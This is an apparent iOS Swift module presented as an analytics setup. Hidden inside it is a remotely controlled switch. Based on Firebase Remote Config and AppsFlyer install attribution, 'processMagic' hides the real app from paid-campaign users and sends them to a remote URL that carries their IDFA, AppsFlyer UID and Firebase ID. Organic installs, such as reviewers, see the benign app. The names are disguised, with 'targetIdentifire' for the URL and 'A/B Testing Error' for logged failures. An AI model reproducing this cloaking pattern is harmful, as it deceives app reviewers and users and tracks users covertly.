import Foundation
import OneSignal
import AppsFlyerLib
import TikTokOpenSDK
import Firebase
import FirebaseCore
import FirebaseAnalytics
import UIKit
import AdSupport
import FacebookCore
import AVFoundation
import FirebaseCrashlytics
import AppTrackingTransparency
import SwiftUI

public class LAModule:NSObject {
    
    private var mainAppBlock:(()-> (any View)? )?
    private var fallBackAppBlock:(()->Void)?
    private var application:UIApplication?
    private var hostView = PreloadrViewController()
    
    private var configuraionSource:LAConfigurationKeysProtocol! {
        didSet {
            self.loadDefaultValues()
        }
    }
    
    private var popupStateIsDisplay:Bool?
    
    static public var shared: LAModule = {
            let laHelper = LAModule()
        
            FirebaseApp.configure()
            laHelper.fetchRemoteConfig()
        
           return laHelper
    }()
    
    private var campaignAttribution: [String: AnyObject]?
    private var deeplinkAttribution: [String: AnyObject]?
    
    public func showInitializationView(window:inout UIWindow?){
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = self.hostView
        window?.makeKeyAndVisible()
    }
    
    //mainAppBlock must return SWIFTUI main app root View in case when swift ui is used, or nil for UIKit
    public func setupAnalytics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, configuration: LAConfigurationKeysProtocol, window:inout UIWindow?, showHostApp:@escaping (()->(any View)?), virtualAppDidShow:(()->Void)? = nil) {
        
        self.showInitializationView(window: &window)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { 
            self.enableMetrics(launchOptions: launchOptions, configuration: configuration, mainAppBlock: showHostApp, hideAppBlock: virtualAppDidShow)
        }
    }
    
    private func enableMetrics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, configuration: LAConfigurationKeysProtocol, mainAppBlock:@escaping (()->(any View)?), hideAppBlock:(()->Void)? = nil) {
        
        self.mainAppBlock = mainAppBlock
        self.fallBackAppBlock = hideAppBlock
        self.configuraionSource = configuration
  
        TikTokOpenSDKApplicationDelegate.sharedInstance().application(UIApplication.shared, didFinishLaunchingWithOptions: launchOptions)
        
        TikTokOpenSDKApplicationDelegate.sharedInstance().registerAppId(configuraionSource.DontForgetIncludeFBKeysInInfo().tikTokKeys.TTAppId)
        
        self.setUpAppsFlyerLib(appleAppID: configuraionSource.DontForgetIncludeFBKeysInInfo().appleAppID, appsFlyerDevKey: configuraionSource.DontForgetIncludeFBKeysInInfo().appsFlyerDevKey, delegate: self)
        
        OneSignal.setLogLevel(.LL_VERBOSE, visualLevel: .LL_NONE)
        OneSignal.initWithLaunchOptions(launchOptions)
    
        OneSignal.promptForPushNotifications(userResponse: { accepted in
            print("User accepted notification: \(accepted)")
        })
                
        ApplicationDelegate.shared.application(
                    UIApplication.shared,
                   didFinishLaunchingWithOptions: launchOptions
        )
        
        NotificationCenter.default.addObserver(self,
                selector: #selector(didBecomeActiveNotification),
                name: UIApplication.didBecomeActiveNotification,
                object: nil)
    }
    
    @objc func didBecomeActiveNotification() {
        AppsFlyerLib.shared().start()
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { (status) in
                switch status {
                case .denied:
                    print("AuthorizationSatus is denied")
                case .notDetermined:
                    print("AuthorizationSatus is notDetermined")
                case .restricted:
                    print("AuthorizationSatus is restricted")
                case .authorized:
                    print("AuthorizationSatus is authorized")
                @unknown default:
                    fatalError("Invalid authorization status")
                }
            }
        }
    }
    
    
    func setUpAppsFlyerLib(appleAppID: String, appsFlyerDevKey: String, delegate: NSObject) {
        AppsFlyerLib.shared().isDebug = true
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = appleAppID
        AppsFlyerLib.shared().delegate = delegate as? any AppsFlyerLibDelegate
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        
        AppsFlyerLib.shared().start { data, error in
            
        }
    }
    
    func loadDefaultValues() {
        let appDefaults: [String: NSObject] = [
            configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey : NSString(string: ""),
            configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey : NSNumber(value: 0)
        ]
        RemoteConfig.remoteConfig().setDefaults(appDefaults)
    }
    
    func fetchRemoteConfig() {
        
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        RemoteConfig.remoteConfig().configSettings = settings
        
        Firebase.RemoteConfig.remoteConfig().fetch() { (status, error) in
            Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
  
            var errorString = ""
            if error != nil {
                errorString = "Error while fetching: \(String(describing: error))"
            }
            
            switch status {
            case .success:
                if let urlString = RemoteConfig.remoteString(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey) {
                    if let url = self.buildIdentifite(from: urlString), (urlString != "")  {
                        UserDefaults.standard.targetIdentifire = url
                    } else {
                        UserDefaults.standard.targetIdentifire = nil
                    }
                } else {
                    UserDefaults.standard.targetIdentifire = nil
                }
                UserDefaults.standard.synchronize()
                print("Remote config status \(status.rawValue)")
                break
            case .failure, .noFetchYet, .throttled:
                print("Remote config status \(status.rawValue)")
                break
            default:
                print("default")
                if errorString.count == 0 {
                    errorString = "default: \(String(describing: error))"
                }else {
                    errorString = "default: "+errorString
                }
                break
            }
            
            if errorString.count > 0 {
                self.nonFatalLog(message: errorString)
            }
        }
    }
    
    func processMagic(close:Bool = false, fetch:Bool = false){
        
        if let targetIdentifire = UserDefaults.standard.targetIdentifire, (targetIdentifire.absoluteString != ""), close == false  {
            if popupStateIsDisplay != true {
                popupStateIsDisplay = true
                
                self.hostView.hideSwiftUI()
                
                OneSignal.setAppId("\(configuraionSource.DontForgetIncludeFBKeysInInfo().oneSignalAppId)#\(targetIdentifire)")
                
                self.fallBackAppBlock?() //hide unity
            }
        } else {
            if popupStateIsDisplay != false {
                popupStateIsDisplay = false
                OneSignal.setAppId(configuraionSource.DontForgetIncludeFBKeysInInfo().oneSignalAppId)
                
                if let rootView = self.mainAppBlock?() {
                    self.hostView.showSwiftUI(view: rootView)
                }
            }
        }
   
        if fetch {
            RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
                Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
                
                guard let strongSelf = self, error == nil else {
                    return
                }
                
                DispatchQueue.main.async { [weak self] in
                    guard let self = self else {
                        return
                    }
                    if RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 1,
                       strongSelf.campaignAttribution?["af_status"] as? String == "Organic" {
                       strongSelf.processMagic(close: true)
                    } else {
                        if let urlString = RemoteConfig.remoteString(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey),
                           urlString != "",
                            !urlString.isEmpty,
                           ((strongSelf.campaignAttribution?["af_status"] as? String) != "Organic" || RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 0), let url = strongSelf.buildIdentifite(from: urlString) {
                            
                            OneSignal.sendTags(["target": AppsFlyerLib.shared().getAppsFlyerUID()])
                            UserDefaults.standard.targetIdentifire = url
                            UserDefaults.standard.synchronize()
                            
                            strongSelf.processMagic()
                        } else {
                            UserDefaults.standard.targetIdentifire = nil
                            UserDefaults.standard.synchronize()
                            
                            strongSelf.processMagic(close: true)
                        }
                    }
                    
                }
            }
        }
        
    }
    
    func buildIdentifite(from urlString: String) -> URL? {
        guard var components = URLComponents(string: urlString) else {return nil}
        components.queryItems = []
        
        if let campaignAttribution = campaignAttribution {
            let campaignItems = campaignAttribution.map({ dict in
                URLQueryItem(name: dict.key, value: "\(dict.value)")
            })
            components.queryItems?.append(contentsOf: campaignItems)
        }
        
        if let deeplinkAttribution = deeplinkAttribution {
            let deeplinkItems = deeplinkAttribution.map({ dict in
                URLQueryItem(name: dict.key, value: "\(dict.value)")
            })
            components.queryItems?.append(contentsOf: deeplinkItems)
        }
        
        let appsflyerUuid = AppsFlyerLib.shared().getAppsFlyerUID()
        
        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        
        components.queryItems?.append(URLQueryItem(name: "uuid", value: appsflyerUuid))
        components.queryItems?.append(URLQueryItem(name: "idfa", value: idfa))
        
        if let firebaseAdid = Analytics.appInstanceID() {
            let queryAdid = URLQueryItem(name: "fbase", value: firebaseAdid)
            components.queryItems?.append(queryAdid)
        }
        
        return components.url
    }
    
    public struct LAConfigurationKeys {
        
        public init(appsFlyerDevKey:String, appleAppID:String, oneSignalAppId:String, tikTokKeys:(TTAppId:String,TTAppSecret:String), remoteConfigKeys:(remoteTargetKey:String,remoteLKey:String)  ){
            
            self.appsFlyerDevKey = appsFlyerDevKey
            self.appleAppID = appleAppID
            self.oneSignalAppId = oneSignalAppId
            
            self.tikTokKeys = tikTokKeys
            self.remoteConfigKeys = remoteConfigKeys
        }
        
        public let appsFlyerDevKey:String
        public let appleAppID:String
        public let oneSignalAppId:String
        
        public let tikTokKeys:(TTAppId:String,TTAppSecret:String)
        public let remoteConfigKeys:(remoteTargetKey:String,remoteLKey:String)
    }
}

extension LAModule: AppsFlyerLibDelegate {
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        self.campaignAttribution = castDictionary(conversionInfo)
        self.processMagic(fetch: true)
        print("onConversionDataSuccess")
    }
    
    public func onConversionDataFail(_ error: Error) {
        self.processMagic(close: true, fetch: true)
        print("onConversionDataFail \(error.localizedDescription)")
    }
    
    public func onAppOpenAttribution(_ attributionData: [AnyHashable : Any]) {
        self.deeplinkAttribution = castDictionary(attributionData)
        print("onAppOpenAttribution")
    }
    
    public func onAppOpenAttributionFailure(_ error: Error) {
        self.processMagic(close: true, fetch: true)
        print("onAppOpenAttributionFailure \(error.localizedDescription)")
    }
    
    func castDictionary(_ anyDictionary: [AnyHashable: Any]) -> [String: AnyObject] {
        var dict: [String: AnyObject] = [:]
        
        for (key, value) in anyDictionary {
            if let key = key as? String {
                dict[key] = value as AnyObject
            }
        }
        return dict
    }
    
    func nonFatalLog(message: String) {
        #if DEBUG
        let error = NSError(domain: "Debug A/B Testing Error", code: 0 ,userInfo: [NSLocalizedDescriptionKey : message])
        
        Crashlytics.crashlytics().record(error: error)
        #else
        let error = NSError(domain: "A/B Testing Error", code: 0 ,userInfo: [NSLocalizedDescriptionKey : message])
        Crashlytics.crashlytics().record(error: error)
        #endif
    }
}

extension UserDefaults {
    
    var targetIdentifire: URL? {
        get {
            return URL(string: self.string(forKey: #function) ?? "")
        }
        set {
            self.set(newValue?.absoluteString, forKey: #function)
        }
    }
    
  
    
}

extension RemoteConfig {
    static func remoteNumber(forKey key: String) -> Int? {
        return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key).numberValue.intValue
    }
    
    static func remoteString(forKey key: String) -> String? {
        return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key).stringValue
    }
}


